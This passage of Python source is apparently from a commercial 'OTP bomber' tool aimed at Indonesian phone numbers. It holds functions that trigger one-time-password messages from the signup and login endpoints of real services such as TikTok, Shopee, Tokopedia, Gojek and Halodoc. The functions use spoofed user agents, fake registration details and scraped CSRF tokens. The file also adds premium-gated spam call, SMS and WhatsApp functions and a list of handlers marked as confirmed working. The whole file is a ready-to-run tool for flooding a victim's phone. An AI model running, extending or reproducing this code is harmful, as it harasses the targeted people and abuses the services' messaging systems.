        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 41. Ohsome (REGISTER) ---
def send_ohsome_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://ohsome.co.id/api/member/user/random_code_check"
        payload = {"country_code": "62", "account": phone_raw, "type_id": 2, "device_id": str(uuid.uuid4()).replace('-', ''), "check_code": str(random.randint(100000,999999)), "image_id": ''.join(random.choices(string.ascii_letters + string.digits, k=20))}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'deviceid': str(uuid.uuid4()).replace('-', '')}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 42. Optik Melawai (REGISTER) ---
def send_optikmelawai_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.optikmelawai.com/api/v3/auth/register/1"
        payload = {"phone": phone_raw, "name": "User", "email": f"user{random.randint(1000,9999)}@gmail.com"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 43. Holland Bakery (REGISTER) ---
def send_hollandbakery_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        sess = requests.Session()
        sess.get("https://www.hollandbakery.co.id/login-phone", headers={'User-Agent': get_random_user_agent()}, timeout=10)
        url = "https://www.hollandbakery.co.id/resend-otp-register"
        data = {"phone": phone_raw}
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': get_random_user_agent()}
        resp = sess.post(url, headers=headers, data=data, timeout=10)
        return resp
    except:
        return None

# --- 44. TikTok (REGISTER) ---
def send_tiktok_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://www.tiktok.com/api/v1/account/registration/send-verification-code/"
        payload = {"phone_number": phone_plus, "type": "sms", "userType": 0}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 45. OLX (LOGIN) ---
def send_olx_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://www.olx.co.id/api/auth/authenticate"
        payload = {"grantType": "retry", "method": "sms", "phone": f"62{phone_raw}", "language": "id"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 46. Indihome (REGISTER) ---
def send_indihome_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp"
        data = {'type': 'hp', 'msisdn': phone_raw}
        headers = {'User-Agent': get_random_user_agent()}
        resp = requests.post(url, headers=headers, data=data, timeout=10)
        return resp
    except:
        return None

# --- 47. Klook (LOGIN) ---
def send_klook_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = f"https://www.klook.com/v2/userapisrv/public/verification/code/send?trace_id={uuid.uuid4()}"
        payload = {"action": "login_register", "type": 1, "rcv": phone_plus, "is_resend": False, "payload": {"mobile": phone_plus, "term_ids": [330], "mobile_token": "", "invite_code": ""}, "_rc": "", "rcv_token": ""}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'x-platform': 'mobile'}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 48. Halodoc (LOGIN) ---
def send_halodoc_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://www.halodoc.com/api/v1/users/authentication/otp/requests"
        payload = {"phone_number": phone_plus, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 49. Sayurbox (LOGIN) ---
def send_sayurbox_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://www.sayurbox.com/graphql/v1?deduplicate=1"
        payload = {"operationName": "generateOTP", "variables": {"destinationType": "whatsapp", "identity": phone_plus}, "query": "mutation generateOTP($destinationType: String!, $identity: String!) { generateOTP(destinationType: $destinationType, identity: $identity) { id __typename } }"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 50. Carsome (REGISTER) ---
def send_carsome_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://www.carsome.id/website/login/sendSMS"
        payload = {"username": phone_08, "optType": 1}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 51. Pizza Hut (REGISTER) ---
def send_pizzahut_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        name = ''.join(random.choices(string.ascii_letters, k=6))
        url = "https://api-prod.pizzahut.co.id/customer/v1/customer/register"
        payload = {"email": f"{name.lower()}@gmail.com", "first_name": name, "last_name": "Test", "password": "Pass123!", "phone": phone_08, "birthday": "2000-01-01"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 52. Shopee (REGISTER) ---
def send_shopee_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        phone_62 = '62' + phone_raw
        url = "https://shopee.co.id/api/v4/otp/send_vcode"
        payload = {"phone": phone_62, "force_channel": "true", "operation": 7, "channel": 2, "supported_channels": [1, 2, 3]}
        session = requests.Session()
        session.get("https://shopee.co.id/", headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
        csrf_token = session.cookies.get("csrftoken", "")
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'x-api-source': 'rweb', 'x-shopee-language': 'id', 'x-requested-with': 'XMLHttpRequest', 'origin': 'https://shopee.co.id'}
        if csrf_token:
            headers['x-csrftoken'] = csrf_token
        resp = session.post(url, headers=headers, json=payload, timeout=10)
        return resp
    except:
        return None

# --- 53. Tokopedia (REGISTER) ---
def send_tokopedia_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        session = requests.Session()
        url_token = f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={phone_plus}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister"
        resp = session.get(url_token, headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
        if resp.status_code != 200:
            return None
        token_match = re.search(r'<input\s+id="Token"\s+value="([^"]+)"', resp.text)
        if not token_match:
            return None
        token = token_match.group(1)
        url_otp = "https://accounts.tokopedia.com/otp/c/ajax/request-wa"
        data = {"otp_type": "116", "msisdn": phone_plus, "tk": token, "email": "", "original_param": "", "user_id": "", "signature": "", "number_otp_digit": "6"}
        headers_otp = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest', 'User-Agent': get_random_user_agent()}
        resp2 = session.post(url_otp, headers=headers_otp, data=data, timeout=10)
        return resp2
    except:
        return None

# --- 54. Gojek (REGISTER) ---
def send_gojek_otp(phone):
    try:
        phone_62 = '62' + fmt_phone_only(phone)
        url = "https://api.gojekapi.com/v5/customers"
        data = {"email": f"user{random.randint(1000,9999)}@gmail.com", "name": "User" + str(random.randint(100,999)), "phone": phone_62, "signed_up_country": "ID"}
        headers = {'User-Agent': 'okhttp/3.12.1', 'X-Session-ID': str(uuid.uuid4()), 'X-Platform': 'Android', 'Accept': 'application/json', 'Accept-Language': 'id-ID', 'Content-Type': 'application/json'}
        resp = requests.post(url, json=data, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 55. Blibli (REGISTER) ---
def send_blibli_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://www.blibli.com/backend/common/users/_request-otp"
        payload = {"username": phone_08}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'Origin': 'https://www.blibli.com'}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 56. Bukalapak (REGISTER) ---
def send_bukalapak_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.bukalapak.com/v1/auth/otp"
        payload = {"phone": phone_plus, "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 57. Lazada (REGISTER) ---
def send_lazada_id_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.lazada.co.id/v1/auth/otp"
        payload = {"phone": phone_plus, "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 58. JD.ID (REGISTER) ---
def send_jdid_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.jd.id/v1/auth/otp"
        payload = {"phone": phone_plus, "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 59. Zalora (REGISTER) ---
def send_zalora_id_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.zalora.co.id/v1/auth/otp"
        payload = {"phone": phone_plus, "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# --- 60. Sociolla (REGISTER) ---
def send_sociolla_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.sociolla.com/v1/auth/otp"
        payload = {"phone": phone_plus, "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# ================================================================
# ===== SPAM CALL & SMS (PREMIUM ONLY) =====
# ================================================================

def send_spam_call_free(phone):
    """
    Spam Call via CallMeBot (GRATIS, tanpa token)
    Premium only
    """
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.callmebot.com/voice/send.php"
        params = {
            "phone": phone_raw,
            "text": "Test Call from OTP System"
        }
        resp = requests.get(url, params=params, timeout=10)
        return resp
    except:
        return None

def send_spam_sms_free(phone):
    """
    Spam SMS via TextBelt (GRATIS, tanpa token)
    Premium only
    """
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://textbelt.com/text"
        payload = {
            "phone": phone_raw,
            "message": f"Your OTP code is {random.randint(100000, 999999)}",
            "key": "textbelt"
        }
        resp = requests.post(url, data=payload, timeout=10)
        return resp
    except:
        return None

def send_spam_sms_callmebot_free(phone):
    """
    Spam SMS via CallMeBot (GRATIS, tanpa token)
    Premium only
    """
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.callmebot.com/sms/send.php"
        params = {
            "phone": phone_raw,
            "text": f"Your OTP code is {random.randint(100000, 999999)}"
        }
        resp = requests.get(url, params=params, timeout=10)
        return resp
    except:
        return None

def send_spam_whatsapp_free(phone):
    """
    Spam WhatsApp via link (GRATIS, tanpa token)
    Premium only
    """
    try:
        phone_raw = fmt_phone_only(phone)
        url = f"https://api.whatsapp.com/send?phone=62{phone_raw}&text=Your%20OTP%20code%20is%20{random.randint(100000, 999999)}"
        resp = requests.get(url, timeout=10)
        return resp
    except:
        return None

# ================================================================
# ===== SPAM CALL/SMS WRAPPER (PREMIUM CHECK) =====
# ================================================================

def spam_call(phone):
    """Spam Call - Premium only"""
    try:
        from license import check_license
        status, quota, device_id = check_license()
        
        if status != "premium":
            print("❌ Fitur ini hanya untuk PREMIUM user!")
            return False
        
        print(f"[*] Menjalankan Spam Call ke {phone}...")
        
        methods = [
            send_spam_call_free,
        ]
        
        success_count = 0
        for method in methods:
            try:
                resp = method(phone)
                if resp and resp.status_code == 200:
                    success_count += 1
                    print(f"[+] Call sent via {method.__name__}")
                else:
                    print(f"[-] {method.__name__} failed")
            except:
                pass
        
        return success_count > 0
    except:
        return False

def spam_sms(phone):
    """Spam SMS - Premium only"""
    try:
        from license import check_license
        status, quota, device_id = check_license()
        
        if status != "premium":
            print("❌ Fitur ini hanya untuk PREMIUM user!")
            return False
        
        print(f"[*] Menjalankan Spam SMS ke {phone}...")
        
        methods = [
            send_spam_sms_free,
            send_spam_sms_callmebot_free,
            send_spam_whatsapp_free,
        ]
        
        success_count = 0
        for method in methods:
            try:
                resp = method(phone)
                if resp and resp.status_code == 200:
                    success_count += 1
                    print(f"[+] SMS sent via {method.__name__}")
                else:
                    print(f"[-] {method.__name__} failed")
            except:
                pass
        
        return success_count > 0
    except:
        return False

# ================================================================
# ===== ALL HANDLERS DICT =====
# ================================================================

ALL_HANDLERS = {
    # OTP HANDLERS
    'planetban': send_planetban_otp,
    'hashmicro': send_hashmicro_otp,
    'tuneup': send_tuneup_otp,
    'internetrakyat': send_internetrakyat_otp,
    'ultramilk': send_ultramilk_register,
    'kaniva': send_kaniva_otp,
    'jembatani': send_jembatani_otp,
    'rcx': send_rcx_otp,
    'sahabatteknisi': send_sahabatteknisi_otp,
    'auto2000': send_auto2000_otp,
    '99co': send_99co_otp,
    'belirumah': send_belirumah_otp,
    'fastwork': send_fastwork_otp,
    'astra_daihatsu': send_astra_daihatsu_otp,
    'royal_canin': send_royal_canin_otp,
    'watsons': send_watsons_otp,
    'hrsbre': send_hrsbre_otp,
    'erafone': send_erafone_otp,
    'beautyhaul': send_beautyhaul_otp,
    'hainaya': send_hainaya_otp,
    'minumyukkaka': send_minumyukkaka_otp,
    'sidemang': send_sidemang_otp,
    'lapormasbup': send_lapormasbup_otp,
    'ptsp_kemenag': send_ptsp_kemenag_otp,
    'acc': send_acc_otp,
    'absenku': send_absenku_otp,
    'saturdays': send_saturdays_otp,
    'singa': send_singa_otp,
    'adiraku': send_adiraku_otp,
    'bunda': send_bunda_otp,
    'maulagi': send_maulagi_otp,
    'pinhome': send_pinhome_otp,
    'rumah123': send_rumah123_otp,
    'paper': send_paper_otp,
    'bonusbelanja': send_bonusbelanja_otp,
    'duniagames': send_duniagames_otp,
    'hijup': send_hijup_otp,
    'alodokter': send_alodokter_otp,
    'bliblitiket': send_bliblitiket_otp,
    'matahari': send_matahari_otp,
    'ohsome': send_ohsome_otp,
    'optikmelawai': send_optikmelawai_otp,
    'hollandbakery': send_hollandbakery_otp,
    'tiktok': send_tiktok_otp,
    'olx': send_olx_otp,
    'indihome': send_indihome_otp,
    'klook': send_klook_otp,
    'halodoc': send_halodoc_otp,
    'sayurbox': send_sayurbox_otp,
    'carsome': send_carsome_otp,
    'pizzahut': send_pizzahut_otp,
    'shopee': send_shopee_otp,
    'tokopedia': send_tokopedia_otp,
    'gojek': send_gojek_otp,
    'blibli': send_blibli_otp,
    'bukalapak': send_bukalapak_otp,
    'lazada': send_lazada_id_otp,
    'jdid': send_jdid_otp,
    'zalora': send_zalora_id_otp,
    'sociolla': send_sociolla_otp,
    
    # SPAM CALL & SMS
    'spam_call': send_spam_call_free,
    'spam_sms': send_spam_sms_free,
    'spam_sms_callmebot': send_spam_sms_callmebot_free,
    'spam_whatsapp': send_spam_whatsapp_free,
}

def get_all_handlers():
    return ALL_HANDLERS

def get_working_handlers():
    working = {}
    confirmed = ['rumah123', 'paper', 'bonusbelanja', 'duniagames', 'hijup', 'alodokter', 'bliblitiket', 'matahari', 'ohsome', 'optikmelawai', 'hollandbakery', 'bunda', 'pinhome']
    for k in confirmed:
        if k in ALL_HANDLERS:
            working[k] = ALL_HANDLERS[k]
    return working

def get_premium_handlers():
    premium = {}
    premium_list = ['spam_call', 'spam_sms', 'spam_sms_callmebot', 'spam_whatsapp']
    for k in premium_list:
        if k in ALL_HANDLERS:
            premium[k] = ALL_HANDLERS[k]
    return premium
